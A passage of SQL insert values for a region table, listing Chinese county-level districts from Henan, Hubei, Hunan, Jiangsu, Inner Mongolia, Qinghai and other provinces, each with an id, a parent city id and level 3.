龙区',3),(1273,150,'吉利区',3),(1274,150,'偃师市',3),(1275,150,'孟津县',3),(1276,150,'新安县',3),(1277,150,'栾川县',3),(1278,150,'嵩县',3),(1279,150,'汝阳县',3),(1280,150,'宜阳县',3),(1281,150,'洛宁县',3),(1282,150,'伊川县',3),(1283,151,'鼓楼区',3),(1284,151,'龙亭区',3),(1285,151,'顺河回族区',3),(1286,151,'金明区',3),(1287,151,'禹王台区',3),(1288,151,'杞县',3),(1289,151,'通许县',3),(1290,151,'尉氏县',3),(1291,151,'开封县',3),(1292,151,'兰考县',3),(1293,152,'北关区',3),(1294,152,'文峰区',3),(1295,152,'殷都区',3),(1296,152,'龙安区',3),(1297,152,'林州市',3),(1298,152,'安阳县',3),(1299,152,'汤阴县',3),(1300,152,'滑县',3),(1301,152,'内黄县',3),(1302,153,'淇滨区',3),(1303,153,'山城区',3),(1304,153,'鹤山区',3),(1305,153,'浚县',3),(1306,153,'淇县',3),(1307,154,'济源市',3),(1308,155,'解放区',3),(1309,155,'中站区',3),(1310,155,'马村区',3),(1311,155,'山阳区',3),(1312,155,'沁阳市',3),(1313,155,'孟州市',3),(1314,155,'修武县',3),(1315,155,'博爱县',3),(1316,155,'武陟县',3),(1317,155,'温县',3),(1318,156,'卧龙区',3),(1319,156,'宛城区',3),(1320,156,'邓州市',3),(1321,156,'南召县',3),(1322,156,'方城县',3),(1323,156,'西峡县',3),(1324,156,'镇平县',3),(1325,156,'内乡县',3),(1326,156,'淅川县',3),(1327,156,'社旗县',3),(1328,156,'唐河县',3),(1329,156,'新野县',3),(1330,156,'桐柏县',3),(1331,157,'新华区',3),(1332,157,'卫东区',3),(1333,157,'湛河区',3),(1334,157,'石龙区',3),(1335,157,'舞钢市',3),(1336,157,'汝州市',3),(1337,157,'宝丰县',3),(1338,157,'叶县',3),(1339,157,'鲁山县',3),(1340,157,'郏县',3),(1341,158,'湖滨区',3),(1342,158,'义马市',3),(1343,158,'灵宝市',3),(1344,158,'渑池县',3),(1345,158,'陕县',3),(1346,158,'卢氏县',3),(1347,159,'梁园区',3),(1348,159,'睢阳区',3),(1349,159,'永城市',3),(1350,159,'民权县',3),(1351,159,'睢县',3),(1352,159,'宁陵县',3),(1353,159,'虞城县',3),(1354,159,'柘城县',3),(1355,159,'夏邑县',3),(1356,160,'卫滨区',3),(1357,160,'红旗区',3),(1358,160,'凤泉区',3),(1359,160,'牧野区',3),(1360,160,'卫辉市',3),(1361,160,'辉县市',3),(1362,160,'新乡县',3),(1363,160,'获嘉县',3),(1364,160,'原阳县',3),(1365,160,'延津县',3),(1366,160,'封丘县',3),(1367,160,'长垣县',3),(1368,161,'浉河区',3),(1369,161,'平桥区',3),(1370,161,'罗山县',3),(1371,161,'光山县',3),(1372,161,'新县',3),(1373,161,'商城县',3),(1374,161,'固始县',3),(1375,161,'潢川县',3),(1376,161,'淮滨县',3),(1377,161,'息县',3),(1378,162,'魏都区',3),(1379,162,'禹州市',3),(1380,162,'长葛市',3),(1381,162,'许昌县',3),(1382,162,'鄢陵县',3),(1383,162,'襄城县',3),(1384,163,'川汇区',3),(1385,163,'项城市',3),(1386,163,'扶沟县',3),(1387,163,'西华县',3),(1388,163,'商水县',3),(1389,163,'沈丘县',3),(1390,163,'郸城县',3),(1391,163,'淮阳县',3),(1392,163,'太康县',3),(1393,163,'鹿邑县',3),(1394,164,'驿城区',3),(1395,164,'西平县',3),(1396,164,'上蔡县',3),(1397,164,'平舆县',3),(1398,164,'正阳县',3),(1399,164,'确山县',3),(1400,164,'泌阳县',3),(1401,164,'汝南县',3),(1402,164,'遂平县',3),(1403,164,'新蔡县',3),(1404,165,'郾城区',3),(1405,165,'源汇区',3),(1406,165,'召陵区',3),(1407,165,'舞阳县',3),(1408,165,'临颍县',3),(1409,166,'华龙区',3),(1410,166,'清丰县',3),(1411,166,'南乐县',3),(1412,166,'范县',3),(1413,166,'台前县',3),(1414,166,'濮阳县',3),(1415,167,'道里区',3),(1416,167,'南岗区',3),(1417,167,'动力区',3),(1418,167,'平房区',3),(1419,167,'香坊区',3),(1420,167,'太平区',3),(1421,167,'道外区',3),(1422,167,'阿城区',3),(1423,167,'呼兰区',3),(1424,167,'松北区',3),(1425,167,'尚志市',3),(1426,167,'双城市',3),(1427,167,'五常市',3),(1428,167,'方正县',3),(1429,167,'宾县',3),(1430,167,'依兰县',3),(1431,167,'巴彦县',3),(1432,167,'通河县',3),(1433,167,'木兰县',3),(1434,167,'延寿县',3),(1435,168,'萨尔图区',3),(1436,168,'红岗区',3),(1437,168,'龙凤区',3),(1438,168,'让胡路区',3),(1439,168,'大同区',3),(1440,168,'肇州县',3),(1441,168,'肇源县',3),(1442,168,'林甸县',3),(1443,168,'杜尔伯特',3),(1444,169,'呼玛县',3),(1445,169,'漠河县',3),(1446,169,'塔河县',3),(1447,170,'兴山区',3),(1448,170,'工农区',3),(1449,170,'南山区',3),(1450,170,'兴安区',3),(1451,170,'向阳区',3),(1452,170,'东山区',3),(1453,170,'萝北县',3),(1454,170,'绥滨县',3),(1455,171,'爱辉区',3),(1456,171,'五大连池市',3),(1457,171,'北安市',3),(1458,171,'嫩江县',3),(1459,171,'逊克县',3),(1460,171,'孙吴县',3),(1461,172,'鸡冠区',3),(1462,172,'恒山区',3),(1463,172,'城子河区',3),(1464,172,'滴道区',3),(1465,172,'梨树区',3),(1466,172,'虎林市',3),(1467,172,'密山市',3),(1468,172,'鸡东县',3),(1469,173,'前进区',3),(1470,173,'郊区',3),(1471,173,'向阳区',3),(1472,173,'东风区',3),(1473,173,'同江市',3),(1474,173,'富锦市',3),(1475,173,'桦南县',3),(1476,173,'桦川县',3),(1477,173,'汤原县',3),(1478,173,'抚远县',3),(1479,174,'爱民区',3),(1480,174,'东安区',3),(1481,174,'阳明区',3),(1482,174,'西安区',3),(1483,174,'绥芬河市',3),(1484,174,'海林市',3),(1485,174,'宁安市',3),(1486,174,'穆棱市',3),(1487,174,'东宁县',3),(1488,174,'林口县',3),(1489,175,'桃山区',3),(1490,175,'新兴区',3),(1491,175,'茄子河区',3),(1492,175,'勃利县',3),(1493,176,'龙沙区',3),(1494,176,'昂昂溪区',3),(1495,176,'铁峰区',3),(1496,176,'建华区',3),(1497,176,'富拉尔基区',3),(1498,176,'碾子山区',3),(1499,176,'梅里斯达斡尔区',3),(1500,176,'讷河市',3),(1501,176,'龙江县',3),(1502,176,'依安县',3),(1503,176,'泰来县',3),(1504,176,'甘南县',3),(1505,176,'富裕县',3),(1506,176,'克山县',3),(1507,176,'克东县',3),(1508,176,'拜泉县',3),(1509,177,'尖山区',3),(1510,177,'岭东区',3),(1511,177,'四方台区',3),(1512,177,'宝山区',3),(1513,177,'集贤县',3),(1514,177,'友谊县',3),(1515,177,'宝清县',3),(1516,177,'饶河县',3),(1517,178,'北林区',3),(1518,178,'安达市',3),(1519,178,'肇东市',3),(1520,178,'海伦市',3),(1521,178,'望奎县',3),(1522,178,'兰西县',3),(1523,178,'青冈县',3),(1524,178,'庆安县',3),(1525,178,'明水县',3),(1526,178,'绥棱县',3),(1527,179,'伊春区',3),(1528,179,'带岭区',3),(1529,179,'南岔区',3),(1530,179,'金山屯区',3),(1531,179,'西林区',3),(1532,179,'美溪区',3),(1533,179,'乌马河区',3),(1534,179,'翠峦区',3),(1535,179,'友好区',3),(1536,179,'上甘岭区',3),(1537,179,'五营区',3),(1538,179,'红星区',3),(1539,179,'新青区',3),(1540,179,'汤旺河区',3),(1541,179,'乌伊岭区',3),(1542,179,'铁力市',3),(1543,179,'嘉荫县',3),(1544,180,'江岸区',3),(1545,180,'武昌区',3),(1546,180,'江汉区',3),(1547,180,'硚口区',3),(1548,180,'汉阳区',3),(1549,180,'青山区',3),(1550,180,'洪山区',3),(1551,180,'东西湖区',3),(1552,180,'汉南区',3),(1553,180,'蔡甸区',3),(1554,180,'江夏区',3),(1555,180,'黄陂区',3),(1556,180,'新洲区',3),(1557,180,'经济开发区',3),(1558,181,'仙桃市',3),(1559,182,'鄂城区',3),(1560,182,'华容区',3),(1561,182,'梁子湖区',3),(1562,183,'黄州区',3),(1563,183,'麻城市',3),(1564,183,'武穴市',3),(1565,183,'团风县',3),(1566,183,'红安县',3),(1567,183,'罗田县',3),(1568,183,'英山县',3),(1569,183,'浠水县',3),(1570,183,'蕲春县',3),(1571,183,'黄梅县',3),(1572,184,'黄石港区',3),(1573,184,'西塞山区',3),(1574,184,'下陆区',3),(1575,184,'铁山区',3),(1576,184,'大冶市',3),(1577,184,'阳新县',3),(1578,185,'东宝区',3),(1579,185,'掇刀区',3),(1580,185,'钟祥市',3),(1581,185,'京山县',3),(1582,185,'沙洋县',3),(1583,186,'沙市区',3),(1584,186,'荆州区',3),(1585,186,'石首市',3),(1586,186,'洪湖市',3),(1587,186,'松滋市',3),(1588,186,'公安县',3),(1589,186,'监利县',3),(1590,186,'江陵县',3),(1591,187,'潜江市',3),(1592,188,'神农架林区',3),(1593,189,'张湾区',3),(1594,189,'茅箭区',3),(1595,189,'丹江口市',3),(1596,189,'郧县',3),(1597,189,'郧西县',3),(1598,189,'竹山县',3),(1599,189,'竹溪县',3),(1600,189,'房县',3),(1601,190,'曾都区',3),(1602,190,'广水市',3),(1603,191,'天门市',3),(1604,192,'咸安区',3),(1605,192,'赤壁市',3),(1606,192,'嘉鱼县',3),(1607,192,'通城县',3),(1608,192,'崇阳县',3),(1609,192,'通山县',3),(1610,193,'襄城区',3),(1611,193,'樊城区',3),(1612,193,'襄阳区',3),(1613,193,'老河口市',3),(1614,193,'枣阳市',3),(1615,193,'宜城市',3),(1616,193,'南漳县',3),(1617,193,'谷城县',3),(1618,193,'保康县',3),(1619,194,'孝南区',3),(1620,194,'应城市',3),(1621,194,'安陆市',3),(1622,194,'汉川市',3),(1623,194,'孝昌县',3),(1624,194,'大悟县',3),(1625,194,'云梦县',3),(1626,195,'长阳',3),(1627,195,'五峰',3),(1628,195,'西陵区',3),(1629,195,'伍家岗区',3),(1630,195,'点军区',3),(1631,195,'猇亭区',3),(1632,195,'夷陵区',3),(1633,195,'宜都市',3),(1634,195,'当阳市',3),(1635,195,'枝江市',3),(1636,195,'远安县',3),(1637,195,'兴山县',3),(1638,195,'秭归县',3),(1639,196,'恩施市',3),(1640,196,'利川市',3),(1641,196,'建始县',3),(1642,196,'巴东县',3),(1643,196,'宣恩县',3),(1644,196,'咸丰县',3),(1645,196,'来凤县',3),(1646,196,'鹤峰县',3),(1647,197,'岳麓区',3),(1648,197,'芙蓉区',3),(1649,197,'天心区',3),(1650,197,'开福区',3),(1651,197,'雨花区',3),(1652,197,'开发区',3),(1653,197,'浏阳市',3),(1654,197,'长沙县',3),(1655,197,'望城县',3),(1656,197,'宁乡县',3),(1657,198,'永定区',3),(1658,198,'武陵源区',3),(1659,198,'慈利县',3),(1660,198,'桑植县',3),(1661,199,'武陵区',3),(1662,199,'鼎城区',3),(1663,199,'津市市',3),(1664,199,'安乡县',3),(1665,199,'汉寿县',3),(1666,199,'澧县',3),(1667,199,'临澧县',3),(1668,199,'桃源县',3),(1669,199,'石门县',3),(1670,200,'北湖区',3),(1671,200,'苏仙区',3),(1672,200,'资兴市',3),(1673,200,'桂阳县',3),(1674,200,'宜章县',3),(1675,200,'永兴县',3),(1676,200,'嘉禾县',3),(1677,200,'临武县',3),(1678,200,'汝城县',3),(1679,200,'桂东县',3),(1680,200,'安仁县',3),(1681,201,'雁峰区',3),(1682,201,'珠晖区',3),(1683,201,'石鼓区',3),(1684,201,'蒸湘区',3),(1685,201,'南岳区',3),(1686,201,'耒阳市',3),(1687,201,'常宁市',3),(1688,201,'衡阳县',3),(1689,201,'衡南县',3),(1690,201,'衡山县',3),(1691,201,'衡东县',3),(1692,201,'祁东县',3),(1693,202,'鹤城区',3),(1694,202,'靖州',3),(1695,202,'麻阳',3),(1696,202,'通道',3),(1697,202,'新晃',3),(1698,202,'芷江',3),(1699,202,'沅陵县',3),(1700,202,'辰溪县',3),(1701,202,'溆浦县',3),(1702,202,'中方县',3),(1703,202,'会同县',3),(1704,202,'洪江市',3),(1705,203,'娄星区',3),(1706,203,'冷水江市',3),(1707,203,'涟源市',3),(1708,203,'双峰县',3),(1709,203,'新化县',3),(1710,204,'城步',3),(1711,204,'双清区',3),(1712,204,'大祥区',3),(1713,204,'北塔区',3),(1714,204,'武冈市',3),(1715,204,'邵东县',3),(1716,204,'新邵县',3),(1717,204,'邵阳县',3),(1718,204,'隆回县',3),(1719,204,'洞口县',3),(1720,204,'绥宁县',3),(1721,204,'新宁县',3),(1722,205,'岳塘区',3),(1723,205,'雨湖区',3),(1724,205,'湘乡市',3),(1725,205,'韶山市',3),(1726,205,'湘潭县',3),(1727,206,'吉首市',3),(1728,206,'泸溪县',3),(1729,206,'凤凰县',3),(1730,206,'花垣县',3),(1731,206,'保靖县',3),(1732,206,'古丈县',3),(1733,206,'永顺县',3),(1734,206,'龙山县',3),(1735,207,'赫山区',3),(1736,207,'资阳区',3),(1737,207,'沅江市',3),(1738,207,'南县',3),(1739,207,'桃江县',3),(1740,207,'安化县',3),(1741,208,'江华',3),(1742,208,'冷水滩区',3),(1743,208,'零陵区',3),(1744,208,'祁阳县',3),(1745,208,'东安县',3),(1746,208,'双牌县',3),(1747,208,'道县',3),(1748,208,'江永县',3),(1749,208,'宁远县',3),(1750,208,'蓝山县',3),(1751,208,'新田县',3),(1752,209,'岳阳楼区',3),(1753,209,'君山区',3),(1754,209,'云溪区',3),(1755,209,'汨罗市',3),(1756,209,'临湘市',3),(1757,209,'岳阳县',3),(1758,209,'华容县',3),(1759,209,'湘阴县',3),(1760,209,'平江县',3),(1761,210,'天元区',3),(1762,210,'荷塘区',3),(1763,210,'芦淞区',3),(1764,210,'石峰区',3),(1765,210,'醴陵市',3),(1766,210,'株洲县',3),(1767,210,'攸县',3),(1768,210,'茶陵县',3),(1769,210,'炎陵县',3),(1770,211,'朝阳区',3),(1771,211,'宽城区',3),(1772,211,'二道区',3),(1773,211,'南关区',3),(1774,211,'绿园区',3),(1775,211,'双阳区',3),(1776,211,'净月潭开发区',3),(1777,211,'高新技术开发区',3),(1778,211,'经济技术开发区',3),(1779,211,'汽车产业开发区',3),(1780,211,'德惠市',3),(1781,211,'九台市',3),(1782,211,'榆树市',3),(1783,211,'农安县',3),(1784,212,'船营区',3),(1785,212,'昌邑区',3),(1786,212,'龙潭区',3),(1787,212,'丰满区',3),(1788,212,'蛟河市',3),(1789,212,'桦甸市',3),(1790,212,'舒兰市',3),(1791,212,'磐石市',3),(1792,212,'永吉县',3),(1793,213,'洮北区',3),(1794,213,'洮南市',3),(1795,213,'大安市',3),(1796,213,'镇赉县',3),(1797,213,'通榆县',3),(1798,214,'江源区',3),(1799,214,'八道江区',3),(1800,214,'长白',3),(1801,214,'临江市',3),(1802,214,'抚松县',3),(1803,214,'靖宇县',3),(1804,215,'龙山区',3),(1805,215,'西安区',3),(1806,215,'东丰县',3),(1807,215,'东辽县',3),(1808,216,'铁西区',3),(1809,216,'铁东区',3),(1810,216,'伊通',3),(1811,216,'公主岭市',3),(1812,216,'双辽市',3),(1813,216,'梨树县',3),(1814,217,'前郭尔罗斯',3),(1815,217,'宁江区',3),(1816,217,'长岭县',3),(1817,217,'乾安县',3),(1818,217,'扶余县',3),(1819,218,'东昌区',3),(1820,218,'二道江区',3),(1821,218,'梅河口市',3),(1822,218,'集安市',3),(1823,218,'通化县',3),(1824,218,'辉南县',3),(1825,218,'柳河县',3),(1826,219,'延吉市',3),(1827,219,'图们市',3),(1828,219,'敦化市',3),(1829,219,'珲春市',3),(1830,219,'龙井市',3),(1831,219,'和龙市',3),(1832,219,'安图县',3),(1833,219,'汪清县',3),(1834,220,'玄武区',3),(1835,220,'鼓楼区',3),(1836,220,'白下区',3),(1837,220,'建邺区',3),(1838,220,'秦淮区',3),(1839,220,'雨花台区',3),(1840,220,'下关区',3),(1841,220,'栖霞区',3),(1842,220,'浦口区',3),(1843,220,'江宁区',3),(1844,220,'六合区',3),(1845,220,'溧水县',3),(1846,220,'高淳县',3),(1847,221,'沧浪区',3),(1848,221,'金阊区',3),(1849,221,'平江区',3),(1850,221,'虎丘区',3),(1851,221,'吴中区',3),(1852,221,'相城区',3),(1853,221,'园区',3),(1854,221,'新区',3),(1855,221,'常熟市',3),(1856,221,'张家港市',3),(1857,221,'玉山镇',3),(1858,221,'巴城镇',3),(1859,221,'周市镇',3),(1860,221,'陆家镇',3),(1861,221,'花桥镇',3),(1862,221,'淀山湖镇',3),(1863,221,'张浦镇',3),(1864,221,'周庄镇',3),(1865,221,'千灯镇',3),(1866,221,'锦溪镇',3),(1867,221,'开发区',3),(1868,221,'吴江市',3),(1869,221,'太仓市',3),(1870,222,'崇安区',3),(1871,222,'北塘区',3),(1872,222,'南长区',3),(1873,222,'锡山区',3),(1874,222,'惠山区',3),(1875,222,'滨湖区',3),(1876,222,'新区',3),(1877,222,'江阴市',3),(1878,222,'宜兴市',3),(1879,223,'天宁区',3),(1880,223,'钟楼区',3),(1881,223,'戚墅堰区',3),(1882,223,'郊区',3),(1883,223,'新北区',3),(1884,223,'武进区',3),(1885,223,'溧阳市',3),(1886,223,'金坛市',3),(1887,224,'清河区',3),(1888,224,'清浦区',3),(1889,224,'楚州区',3),(1890,224,'淮阴区',3),(1891,224,'涟水县',3),(1892,224,'洪泽县',3),(1893,224,'盱眙县',3),(1894,224,'金湖县',3),(1895,225,'新浦区',3),(1896,225,'连云区',3),(1897,225,'海州区',3),(1898,225,'赣榆县',3),(1899,225,'东海县',3),(1900,225,'灌云县',3),(1901,225,'灌南县',3),(1902,226,'崇川区',3),(1903,226,'港闸区',3),(1904,226,'经济开发区',3),(1905,226,'启东市',3),(1906,226,'如皋市',3),(1907,226,'通州市',3),(1908,226,'海门市',3),(1909,226,'海安县',3),(1910,226,'如东县',3),(1911,227,'宿城区',3),(1912,227,'宿豫区',3),(1913,227,'宿豫县',3),(1914,227,'沭阳县',3),(1915,227,'泗阳县',3),(1916,227,'泗洪县',3),(1917,228,'海陵区',3),(1918,228,'高港区',3),(1919,228,'兴化市',3),(1920,228,'靖江市',3),(1921,228,'泰兴市',3),(1922,228,'姜堰市',3),(1923,229,'云龙区',3),(1924,229,'鼓楼区',3),(1925,229,'九里区',3),(1926,229,'贾汪区',3),(1927,229,'泉山区',3),(1928,229,'新沂市',3),(1929,229,'邳州市',3),(1930,229,'丰县',3),(1931,229,'沛县',3),(1932,229,'铜山县',3),(1933,229,'睢宁县',3),(1934,230,'城区',3),(1935,230,'亭湖区',3),(1936,230,'盐都区',3),(1937,230,'盐都县',3),(1938,230,'东台市',3),(1939,230,'大丰市',3),(1940,230,'响水县',3),(1941,230,'滨海县',3),(1942,230,'阜宁县',3),(1943,230,'射阳县',3),(1944,230,'建湖县',3),(1945,231,'广陵区',3),(1946,231,'维扬区',3),(1947,231,'邗江区',3),(1948,231,'仪征市',3),(1949,231,'高邮市',3),(1950,231,'江都市',3),(1951,231,'宝应县',3),(1952,232,'京口区',3),(1953,232,'润州区',3),(1954,232,'丹徒区',3),(1955,232,'丹阳市',3),(1956,232,'扬中市',3),(1957,232,'句容市',3),(1958,233,'东湖区',3),(1959,233,'西湖区',3),(1960,233,'青云谱区',3),(1961,233,'湾里区',3),(1962,233,'青山湖区',3),(1963,233,'红谷滩新区',3),(1964,233,'昌北区',3),(1965,233,'高新区',3),(1966,233,'南昌县',3),(1967,233,'新建县',3),(1968,233,'安义县',3),(1969,233,'进贤县',3),(1970,234,'临川区',3),(1971,234,'南城县',3),(1972,234,'黎川县',3),(1973,234,'南丰县',3),(1974,234,'崇仁县',3),(1975,234,'乐安县',3),(1976,234,'宜黄县',3),(1977,234,'金溪县',3),(1978,234,'资溪县',3),(1979,234,'东乡县',3),(1980,234,'广昌县',3),(1981,235,'章贡区',3),(1982,235,'于都县',3),(1983,235,'瑞金市',3),(1984,235,'南康市',3),(1985,235,'赣县',3),(1986,235,'信丰县',3),(1987,235,'大余县',3),(1988,235,'上犹县',3),(1989,235,'崇义县',3),(1990,235,'安远县',3),(1991,235,'龙南县',3),(1992,235,'定南县',3),(1993,235,'全南县',3),(1994,235,'宁都县',3),(1995,235,'兴国县',3),(1996,235,'会昌县',3),(1997,235,'寻乌县',3),(1998,235,'石城县',3),(1999,236,'安福县',3),(2000,236,'吉州区',3),(2001,236,'青原区',3),(2002,236,'井冈山市',3),(2003,236,'吉安县',3),(2004,236,'吉水县',3),(2005,236,'峡江县',3),(2006,236,'新干县',3),(2007,236,'永丰县',3),(2008,236,'泰和县',3),(2009,236,'遂川县',3),(2010,236,'万安县',3),(2011,236,'永新县',3),(2012,237,'珠山区',3),(2013,237,'昌江区',3),(2014,237,'乐平市',3),(2015,237,'浮梁县',3),(2016,238,'浔阳区',3),(2017,238,'庐山区',3),(2018,238,'瑞昌市',3),(2019,238,'九江县',3),(2020,238,'武宁县',3),(2021,238,'修水县',3),(2022,238,'永修县',3),(2023,238,'德安县',3),(2024,238,'星子县',3),(2025,238,'都昌县',3),(2026,238,'湖口县',3),(2027,238,'彭泽县',3),(2028,239,'安源区',3),(2029,239,'湘东区',3),(2030,239,'莲花县',3),(2031,239,'芦溪县',3),(2032,239,'上栗县',3),(2033,240,'信州区',3),(2034,240,'德兴市',3),(2035,240,'上饶县',3),(2036,240,'广丰县',3),(2037,240,'玉山县',3),(2038,240,'铅山县',3),(2039,240,'横峰县',3),(2040,240,'弋阳县',3),(2041,240,'余干县',3),(2042,240,'波阳县',3),(2043,240,'万年县',3),(2044,240,'婺源县',3),(2045,241,'渝水区',3),(2046,241,'分宜县',3),(2047,242,'袁州区',3),(2048,242,'丰城市',3),(2049,242,'樟树市',3),(2050,242,'高安市',3),(2051,242,'奉新县',3),(2052,242,'万载县',3),(2053,242,'上高县',3),(2054,242,'宜丰县',3),(2055,242,'靖安县',3),(2056,242,'铜鼓县',3),(2057,243,'月湖区',3),(2058,243,'贵溪市',3),(2059,243,'余江县',3),(2060,244,'沈河区',3),(2061,244,'皇姑区',3),(2062,244,'和平区',3),(2063,244,'大东区',3),(2064,244,'铁西区',3),(2065,244,'苏家屯区',3),(2066,244,'东陵区',3),(2067,244,'沈北新区',3),(2068,244,'于洪区',3),(2069,244,'浑南新区',3),(2070,244,'新民市',3),(2071,244,'辽中县',3),(2072,244,'康平县',3),(2073,244,'法库县',3),(2074,245,'西岗区',3),(2075,245,'中山区',3),(2076,245,'沙河口区',3),(2077,245,'甘井子区',3),(2078,245,'旅顺口区',3),(2079,245,'金州区',3),(2080,245,'开发区',3),(2081,245,'瓦房店市',3),(2082,245,'普兰店市',3),(2083,245,'庄河市',3),(2084,245,'长海县',3),(2085,246,'铁东区',3),(2086,246,'铁西区',3),(2087,246,'立山区',3),(2088,246,'千山区',3),(2089,246,'岫岩',3),(2090,246,'海城市',3),(2091,246,'台安县',3),(2092,247,'本溪',3),(2093,247,'平山区',3),(2094,247,'明山区',3),(2095,247,'溪湖区',3),(2096,247,'南芬区',3),(2097,247,'桓仁',3),(2098,248,'双塔区',3),(2099,248,'龙城区',3),(2100,248,'喀喇沁左翼蒙古族自治县',3),(2101,248,'北票市',3),(2102,248,'凌源市',3),(2103,248,'朝阳县',3),(2104,248,'建平县',3),(2105,249,'振兴区',3),(2106,249,'元宝区',3),(2107,249,'振安区',3),(2108,249,'宽甸',3),(2109,249,'东港市',3),(2110,249,'凤城市',3),(2111,250,'顺城区',3),(2112,250,'新抚区',3),(2113,250,'东洲区',3),(2114,250,'望花区',3),(2115,250,'清原',3),(2116,250,'新宾',3),(2117,250,'抚顺县',3),(2118,251,'阜新',3),(2119,251,'海州区',3),(2120,251,'新邱区',3),(2121,251,'太平区',3),(2122,251,'清河门区',3),(2123,251,'细河区',3),(2124,251,'彰武县',3),(2125,252,'龙港区',3),(2126,252,'南票区',3),(2127,252,'连山区',3),(2128,252,'兴城市',3),(2129,252,'绥中县',3),(2130,252,'建昌县',3),(2131,253,'太和区',3),(2132,253,'古塔区',3),(2133,253,'凌河区',3),(2134,253,'凌海市',3),(2135,253,'北镇市',3),(2136,253,'黑山县',3),(2137,253,'义县',3),(2138,254,'白塔区',3),(2139,254,'文圣区',3),(2140,254,'宏伟区',3),(2141,254,'太子河区',3),(2142,254,'弓长岭区',3),(2143,254,'灯塔市',3),(2144,254,'辽阳县',3),(2145,255,'双台子区',3),(2146,255,'兴隆台区',3),(2147,255,'大洼县',3),(2148,255,'盘山县',3),(2149,256,'银州区',3),(2150,256,'清河区',3),(2151,256,'调兵山市',3),(2152,256,'开原市',3),(2153,256,'铁岭县',3),(2154,256,'西丰县',3),(2155,256,'昌图县',3),(2156,257,'站前区',3),(2157,257,'西市区',3),(2158,257,'鲅鱼圈区',3),(2159,257,'老边区',3),(2160,257,'盖州市',3),(2161,257,'大石桥市',3),(2162,258,'回民区',3),(2163,258,'玉泉区',3),(2164,258,'新城区',3),(2165,258,'赛罕区',3),(2166,258,'清水河县',3),(2167,258,'土默特左旗',3),(2168,258,'托克托县',3),(2169,258,'和林格尔县',3),(2170,258,'武川县',3),(2171,259,'阿拉善左旗',3),(2172,259,'阿拉善右旗',3),(2173,259,'额济纳旗',3),(2174,260,'临河区',3),(2175,260,'五原县',3),(2176,260,'磴口县',3),(2177,260,'乌拉特前旗',3),(2178,260,'乌拉特中旗',3),(2179,260,'乌拉特后旗',3),(2180,260,'杭锦后旗',3),(2181,261,'昆都仑区',3),(2182,261,'青山区',3),(2183,261,'东河区',3),(2184,261,'九原区',3),(2185,261,'石拐区',3),(2186,261,'白云矿区',3),(2187,261,'土默特右旗',3),(2188,261,'固阳县',3),(2189,261,'达尔罕茂明安联合旗',3),(2190,262,'红山区',3),(2191,262,'元宝山区',3),(2192,262,'松山区',3),(2193,262,'阿鲁科尔沁旗',3),(2194,262,'巴林左旗',3),(2195,262,'巴林右旗',3),(2196,262,'林西县',3),(2197,262,'克什克腾旗',3),(2198,262,'翁牛特旗',3),(2199,262,'喀喇沁旗',3),(2200,262,'宁城县',3),(2201,262,'敖汉旗',3),(2202,263,'东胜区',3),(2203,263,'达拉特旗',3),(2204,263,'准格尔旗',3),(2205,263,'鄂托克前旗',3),(2206,263,'鄂托克旗',3),(2207,263,'杭锦旗',3),(2208,263,'乌审旗',3),(2209,263,'伊金霍洛旗',3),(2210,264,'海拉尔区',3),(2211,264,'莫力达瓦',3),(2212,264,'满洲里市',3),(2213,264,'牙克石市',3),(2214,264,'扎兰屯市',3),(2215,264,'额尔古纳市',3),(2216,264,'根河市',3),(2217,264,'阿荣旗',3),(2218,264,'鄂伦春自治旗',3),(2219,264,'鄂温克族自治旗',3),(2220,264,'陈巴尔虎旗',3),(2221,264,'新巴尔虎左旗',3),(2222,264,'新巴尔虎右旗',3),(2223,265,'科尔沁区',3),(2224,265,'霍林郭勒市',3),(2225,265,'科尔沁左翼中旗',3),(2226,265,'科尔沁左翼后旗',3),(2227,265,'开鲁县',3),(2228,265,'库伦旗',3),(2229,265,'奈曼旗',3),(2230,265,'扎鲁特旗',3),(2231,266,'海勃湾区',3),(2232,266,'乌达区',3),(2233,266,'海南区',3),(2234,267,'化德县',3),(2235,267,'集宁区',3),(2236,267,'丰镇市',3),(2237,267,'卓资县',3),(2238,267,'商都县',3),(2239,267,'兴和县',3),(2240,267,'凉城县',3),(2241,267,'察哈尔右翼前旗',3),(2242,267,'察哈尔右翼中旗',3),(2243,267,'察哈尔右翼后旗',3),(2244,267,'四子王旗',3),(2245,268,'二连浩特市',3),(2246,268,'锡林浩特市',3),(2247,268,'阿巴嘎旗',3),(2248,268,'苏尼特左旗',3),(2249,268,'苏尼特右旗',3),(2250,268,'东乌珠穆沁旗',3),(2251,268,'西乌珠穆沁旗',3),(2252,268,'太仆寺旗',3),(2253,268,'镶黄旗',3),(2254,268,'正镶白旗',3),(2255,268,'正蓝旗',3),(2256,268,'多伦县',3),(2257,269,'乌兰浩特市',3),(2258,269,'阿尔山市',3),(2259,269,'科尔沁右翼前旗',3),(2260,269,'科尔沁右翼中旗',3),(2261,269,'扎赉特旗',3),(2262,269,'突泉县',3),(2263,270,'西夏区',3),(2264,270,'金凤区',3),(2265,270,'兴庆区',3),(2266,270,'灵武市',3),(2267,270,'永宁县',3),(2268,270,'贺兰县',3),(2269,271,'原州区',3),(2270,271,'海原县',3),(2271,271,'西吉县',3),(2272,271,'隆德县',3),(2273,271,'泾源县',3),(2274,271,'彭阳县',3),(2275,272,'惠农县',3),(2276,272,'大武口区',3),(2277,272,'惠农区',3),(2278,272,'陶乐县',3),(2279,272,'平罗县',3),(2280,273,'利通区',3),(2281,273,'中卫县',3),(2282,273,'青铜峡市',3),(2283,273,'中宁县',3),(2284,273,'盐池县',3),(2285,273,'同心县',3),(2286,274,'沙坡头区',3),(2287,274,'海原县',3),(2288,274,'中宁县',3),(2289,275,'城中区',3),(2290,275,'城东区',3),(2291,275,'城西区',3),(2292,275,'城北区',3),(2293,275,'湟中县',3),(2294,275,'湟源县',3),(2295,275,'大通',3),(2296,276,'玛沁县',3),(2297,276,'班玛县',3),(2298,276,'甘德县',3),(2299,276,'达日县',3),(2300,276,'久治县',3),(2301,276,'玛多县',3),(2302,277,'海晏县',3),(2303,277,'祁连县',3),(2304,277,'刚察县',3),(2305,277,'门源',3),(2306,278,'平安县',3),(2307,278,'乐都县',3),(2308,278,'民和',3),(2309,278,'互助',3),(2310,278,'化隆',3),(2311,278,'循化',3),(2312,279,'共和县',3),(2313,279,'同德县',3),(2314,279,'贵德县',3),(2315,279,'兴海县',3),(2316,279,'贵南县',3),(2317,280,'德令哈市',3),(2318,280,'格尔木市',3),(2319,280,'乌兰县',3),(2320,280,'都兰县',3),(2321,280,'天峻县',3),(2322,281,'同仁县',3),(2323,281,'尖扎县',3),(2324,